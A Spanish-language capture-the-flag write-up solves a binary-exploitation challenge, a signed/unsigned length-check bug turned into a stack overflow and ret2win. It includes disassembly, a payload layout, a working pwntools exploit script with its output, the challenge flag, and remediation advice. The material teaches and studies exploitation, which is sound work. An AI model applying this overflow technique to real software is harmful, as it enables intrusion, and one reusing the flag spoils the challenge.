# 🗡️ The Password is Swordfish

> Signed/unsigned mismatch → stack overflow → **ret2win**

| Categoría | Dificultad | Puntos | Autor |
|---|---|---|---|
| Pwn (Binary Exploitation) | 🟢 Easy | 360 | diriartev |

**Flag:** `flag{ebfbe19b6fa7729c}`

---

## Resumen (TL;DR)

**FluidSec Vault** es un servicio de login. El binario pide primero la longitud de la contraseña y luego la contraseña. El check de longitud está roto por un desajuste **signed/unsigned**:

- El límite se valida con una comparación **con signo**: `cmp eax, 0x40 ; jle` → "longitud ≤ 64".
- El bucle de copia usa una comparación **sin signo**: `cmp i, length ; jb`.

Con una longitud negativa (`-1`), el gate con signo pasa (`-1 ≤ 64`), pero como cota sin signo se convierte en `0xFFFFFFFF`, así que el bucle copia sin límite → **stack buffer overflow**.

`login()` no tiene canario y el binario no es PIE, así que se sobrescribe la dirección de retorno con la de `win()`, que abre `/flag.txt` y lo imprime. Un **ret2win** clásico.

| | |
|---|---|
| **Instancia** | `4efcaeaf0c2a82db.chal.ctf.ae:443` (raw sobre TLS) |

## Paso 0 — Extraer el material

El adjunto es un ZIP cifrado con AES (método 99), password `infected`. `unzip` no lo soporta; se usa `7z`:

```bash
7z x -y -pinfected "public(1).zip"   # -> binario 'vault'
```

## Paso 1 — Reconocimiento del binario

```bash
file vault
# vault: ELF 64-bit LSB executable, x86-64, statically linked, not stripped

readelf -l vault | grep GNU_STACK   # NX activado (stack RW, no ejecutable)
readelf -h vault | grep Type        # EXEC -> NO PIE (direcciones fijas)
readelf -s vault | grep stack_chk   # __stack_chk presente (viene de la libc estática)
```

| Protección | Estado |
|---|---|
| Estático + not stripped | ✅ Todos los símbolos (`main`, `login`, `win`) |
| NX | ✅ Activado (no shellcode en la pila, pero no hace falta) |
| PIE | ❌ No — `win()` siempre en `0x401b85` |
| Canary en `login()` | ❌ No (no hay carga de `fs:0x28` antes del `ret`) |

> Que `__stack_chk` exista en la libc estática no significa que la función vulnerable lo use. Hay que verificarlo en el desensamblado.

Strings interesantes:

```bash
strings vault | grep -iE "flag|password|length|granted|denied"
# /flag.txt
# Error: could not read flag.
# Password length:
# Too long! Max 64 characters.
# Password:
# Access granted. Welcome back, admin.
# Access denied.
```

## Paso 2 — Encontrar el bug en `login()`

```bash
objdump -d -M intel vault | awk '/<login>:/{f=1} f{print} /<main>:/{if(f)exit}'
```

```nasm
login:
    push rbp
    mov  rbp, rsp
    sub  rsp, 0x60                      ; frame de 96 bytes
    ...
    lea  rax, [rbp-0x54]                ; &length
    call __isoc99_scanf                 ; scanf("%d", &length) -> length @ rbp-0x54
    ...
    mov  eax, [rbp-0x54]                ; length
    cmp  eax, 0x40
    jle  401c91                         ; ** CON SIGNO **: si length <= 64 -> OK
    ... "Too long! Max 64 characters."  ; exit

401c91:                                 ; imprime "Password:"
    mov  DWORD PTR [rbp-0x4], 0x0       ; i = 0 -> i @ rbp-0x4
loop:
    call getchar                        ; c = getchar() -> c @ rbp-0x8
    cmp  DWORD PTR [rbp-0x8], -1
    je   end                            ; break en EOF
    cmp  DWORD PTR [rbp-0x8], 0xa
    je   end                            ; break en '\n'
    mov  eax, [rbp-0x4]                 ; i
    mov  BYTE PTR [rbp+rax*1-0x50], dl  ; buffer[i] = c -> buffer @ rbp-0x50
    add  DWORD PTR [rbp-0x4], 0x1       ; i++
    mov  eax, [rbp-0x54]                ; length
    cmp  DWORD PTR [rbp-0x4], eax
    jb   loop                           ; ** SIN SIGNO **: si i < length -> sigue
```

Mapa de la pila (offsets desde el inicio del buffer):

| Variable | Dirección | Offset desde `buffer` |
|---|---|---|
| `buffer` | `rbp-0x50` | 0 |
| `c` | `rbp-0x08` | 72 |
| `i` (índice) | `rbp-0x04` | 76 |
| saved `rbp` | `rbp+0x00` | 80 |
| return `RIP` | `rbp+0x08` | 88 |

Con `length = -1`:

- **Gate:** `-1 ≤ 64` → pasa.
- **Bucle:** `i < (unsigned)(-1)` = `i < 0xFFFFFFFF` → prácticamente infinito; se escribe hasta enviar `'\n'`, así que controlamos cuántos bytes desbordamos.

## Paso 3 — La función `win()`

```bash
objdump -d -M intel vault | awk '/<win>:/{f=1} f{print} /<login>:/{if(f)exit}'
```

```nasm
win:                            ; @ 0x401b85
    ...
    lea  rdi, [rip+...]         ; "/flag.txt"
    call fopen
    ...
    lea  rax, [rbp-0x90]
    mov  esi, 0x80
    call fgets                  ; lee la flag
    call puts                   ; la imprime
```

Solo hay que saltar a `0x401b85`.

## Paso 4 — El truco del contador dentro del overflow

**Problema:** el índice `i` está en `rbp-0x4` (offset 76), **dentro** del rango que se desborda. Al escribir el byte 76, el bucle se pisa a sí mismo el contador y se desincroniza.

**Solución:** en los offsets 76–79 se escribe el entero `76` en little-endian (`4c 00 00 00`). Así, al pisar `i`, su valor sigue siendo 76; el `i++` lo lleva a 77 y el conteo continúa limpio hasta la saved `rbp` (80) y la dirección de retorno (88).

### Payload

| Offsets | Contenido | Propósito |
|---|---|---|
| 0–75 | `'A' * 76` | Relleno del buffer |
| 76–79 | `p32(76)` | Repara el índice `i` |
| 80–87 | `'B' * 8` | saved `rbp` (no importa) |
| 88–95 | `p64(0x401b85)` | Sobrescribe `RIP` → `win()` |

Total: 96 bytes. Antes se envía la longitud `-1`.

## Paso 5 — Exploit (pwntools)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
WIN = 0x401b85  # win(): abre /flag.txt y lo imprime

payload  = b'A' * 76
payload += p32(76)      # 4c 00 00 00 -> repara el índice i
payload += b'B' * 8     # saved rbp
payload += p64(WIN)     # RIP -> win()

HOST = "4efcaeaf0c2a82db.chal.ctf.ae"
io = remote(HOST, 443, ssl=True, sni=HOST)

io.recvuntil(b'Password length:')
io.sendline(b'-1')                 # pasa el gate con signo; cota del bucle enorme
io.recvuntil(b'Password:')
io.send(payload + b'\n')           # el '\n' final corta el bucle
print(io.recvall(timeout=5).decode(errors='replace'))
```

```text
$ python3 exploit.py
[+] Opening connection to 4efcaeaf0c2a82db.chal.ctf.ae on port 443: Done
Access denied.
flag{ebfbe19b6fa7729c}
```

> "Access denied." aparece porque la contraseña no coincide, pero da igual: cuando `login()` hace `ret`, salta a `win()`.

🚩 **FLAG:** `flag{ebfbe19b6fa7729c}`

## Anexo — ¿Qué es el *Connection Snippet*?

El reto entrega:

```python
from pwn import *
HOST = "4efcaeaf0c2a82db.chal.ctf.ae"
io = remote(host=HOST, port=443, ssl=True, sni=HOST)
io.interactive()
```

- **`from pwn import *`** — carga pwntools: `remote()`, `process()`, `p64()`/`p32()`, `recvuntil()`, `sendline()`, etc.
- **`remote(HOST, 443, ...)`** — abre un socket contra el servidor. En retos Pwn el binario corre en el servidor y usa tu socket como su `stdin`/`stdout`: el overflow que harías por teclado se envía por la red.
- **`port=443, ssl=True, sni=HOST`** — el servicio va envuelto en TLS en el 443 para atravesar firewalls. `ssl=True` hace el handshake; `sni=HOST` envía el nombre del host (SNI) para que el proxy enrute a la instancia correcta.
- **`io.interactive()`** — shell interactiva sobre la conexión. En un exploit automatizado se reemplaza por `sendline()`/`recvuntil()`.

## Remediación

- No mezclar comparaciones con y sin signo sobre el mismo valor. Validar la longitud con `size_t`/`unsigned` y rechazar valores negativos explícitamente.
- Usar funciones de lectura acotadas (`fgets` con el tamaño del buffer) en vez de un bucle `getchar` con cota controlada por el usuario.
- Compilar con `-fstack-protector-strong`, PIE y Full RELRO.
- No dejar funciones `win()`/backdoor en binarios de producción.

## Conclusión

Cuando veas un check de tamaño "a prueba de balas", verifica la **signedness de ambas comparaciones**: la del límite y la del bucle. En x86, `jle`/`jg` son con signo y `jbe`/`ja`/`jb` sin signo. Un `%d` validado con `<=` pero usado como cota `<` sin signo = puerta abierta a un overflow con longitud negativa. Y confirma siempre si la función vulnerable usa canario de verdad.
